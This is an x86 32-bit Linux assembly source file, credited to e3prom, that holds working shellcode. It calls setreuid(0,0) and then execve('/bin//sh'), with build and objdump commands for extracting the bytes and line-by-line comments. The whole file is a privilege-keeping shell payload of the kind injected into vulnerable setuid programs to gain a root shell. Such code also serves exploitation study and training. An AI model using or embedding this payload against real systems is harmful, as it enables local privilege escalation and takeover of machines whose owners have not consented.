; lnx-execve-setreuid-x86_32.s
; Linux EXECVE(2) + SETREUID(2) shellcode for x86 instruction set.
; Programs automatically drops privileges, unless SETREUID(0) syscall is used.
; Written by e3prom (github.com/e3prom)
;
; nasm -f elf32 lnx-execve-setreuid-x86_32.s
; ld -m elf_i386 lnx-execve-setreuid-x86_32.o -o lnx-execve-setreuid-x86_32
; objdump -d lnx-execve-setreuid-x86_32
BITS 32

section .text
  global _start

  _start:
    ; SETREUID(2) - setreuid  - set real and/or effective user ID
    ;               int setreuid(uid_t ruid, uid_t euid);
    xor eax, eax			; Zero out EAX.
    mov ebx, eax			; Zero out EBX.
    mov edx, eax			; Zero out EDX.
    mov ecx, eax			; Zero out ECX.
    mov al, 0x46			; Syscall 70 setreuid (/usr/include/asm/unistd_32.h:74).
    int 0x80				; Interrupt vector 0x80 (lnx_32 syscall).

    ; EXECVE(2) - execute program
    ;             int execve(const char *filename, char *const argv[], char *const envp[]);
    xor eax, eax			; Zero out EAX.
    push eax				; Push EAX which is all zeros onto the stack.
    push 0x68732f2f			; Push first 4 bytes of the filename string onto the stack.
    push 0x6e69622f			; Push the remaining 4 bytes (python: '/bin//sh'[::-1].encode('hex')).
    mov ebx, esp			; Move ESP to EBX (argv1) to point to the top of the stack where the filename has been pushed.
    push eax				; Push EAX onto the stack, EAX is zero, so a required null register at that position.
    mov edx, esp			; Move ESP to EDX (argv3) to point to the top of the stack where the pushed null register is.
    push ebx				; Push the value of EBX which is the memory address of the filename onto the stack.
    mov ecx, esp			; Move ESP to ECX (argv2) to point to the top of the stack where the filename's memory address pushed is.
    mov al, 0x0b			; Move '0x0b' to AL/EAX (execve syscall number 11).
    int 0x80				; Peform system call through interrupt vector 0x80.
